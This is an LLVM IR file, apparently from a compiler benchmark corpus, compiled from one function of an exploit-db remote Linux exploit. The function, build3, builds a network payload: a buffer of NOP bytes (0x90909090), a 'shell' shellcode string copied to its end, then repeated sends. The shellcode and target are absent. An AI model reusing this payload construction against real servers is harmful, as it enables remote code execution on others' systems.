; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_660.c_build3.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_660.c_build3.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shell = common dso_local global i32 0, align 4
@fill = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @build3(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  store i32 -1869574000, i32* %10, align 4
  %11 = load i32, i32* %3, align 4
  %12 = sub nsw i32 %11, 8
  %13 = call i64 @malloc(i32 %12)
  %14 = inttoptr i64 %13 to i8*
  store i8* %14, i8** %7, align 8
  %15 = load i8*, i8** %7, align 8
  store i8* %15, i8** %5, align 8
  store i32 0, i32* %9, align 4
  br label %16

16:                                               ; preds = %32, %2
  %17 = load i32, i32* %9, align 4
  %18 = load i32, i32* %3, align 4
  %19 = sub nsw i32 %18, 8
  %20 = load i32, i32* @shell, align 4
  %21 = call i32 @strlen(i32 %20)
  %22 = sub nsw i32 %19, %21
  %23 = icmp slt i32 %17, %22
  br i1 %23, label %24, label %35

24:                                               ; preds = %16
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = inttoptr i64 %26 to i32*
  %28 = load i8*, i8** %5, align 8
  %29 = bitcast i8* %28 to i32**
  store i32* %27, i32** %29, align 8
  %30 = load i8*, i8** %5, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 4
  store i8* %31, i8** %5, align 8
  br label %32

32:                                               ; preds = %24
  %33 = load i32, i32* %9, align 4
  %34 = add nsw i32 %33, 4
  store i32 %34, i32* %9, align 4
  br label %16

35:                                               ; preds = %16
  %36 = load i8*, i8** %7, align 8
  store i8* %36, i8** %5, align 8
  %37 = load i32, i32* %3, align 4
  %38 = sub nsw i32 %37, 8
  %39 = load i32, i32* @shell, align 4
  %40 = call i32 @strlen(i32 %39)
  %41 = sub nsw i32 %38, %40
  %42 = load i8*, i8** %5, align 8
  %43 = sext i32 %41 to i64
  %44 = getelementptr inbounds i8, i8* %42, i64 %43
  store i8* %44, i8** %5, align 8
  %45 = load i8*, i8** %5, align 8
  %46 = load i32, i32* @shell, align 4
  %47 = load i32, i32* @shell, align 4
  %48 = call i32 @strlen(i32 %47)
  %49 = call i32 @strncpy(i8* %45, i32 %46, i32 %48)
  %50 = load i32, i32* %3, align 4
  %51 = add nsw i32 %50, 1
  %52 = call i64 @malloc(i32 %51)
  %53 = inttoptr i64 %52 to i8*
  store i8* %53, i8** %8, align 8
  %54 = load i8*, i8** %8, align 8
  store i8* %54, i8** %6, align 8
  %55 = load i8*, i8** %6, align 8
  %56 = load i8*, i8** @fill, align 8
  %57 = load i8*, i8** %7, align 8
  %58 = call i32 @sprintf(i8* %55, i8* %56, i8* %57)
  store i32 0, i32* %9, align 4
  br label %59

59:                                               ; preds = %66, %35
  %60 = load i32, i32* %9, align 4
  %61 = load i32, i32* %4, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %69

63:                                               ; preds = %59
  %64 = load i8*, i8** %8, align 8
  %65 = call i32 @xp_write(i8* %64)
  br label %66

66:                                               ; preds = %63
  %67 = load i32, i32* %9, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %9, align 4
  br label %59

69:                                               ; preds = %59
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @xp_write(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
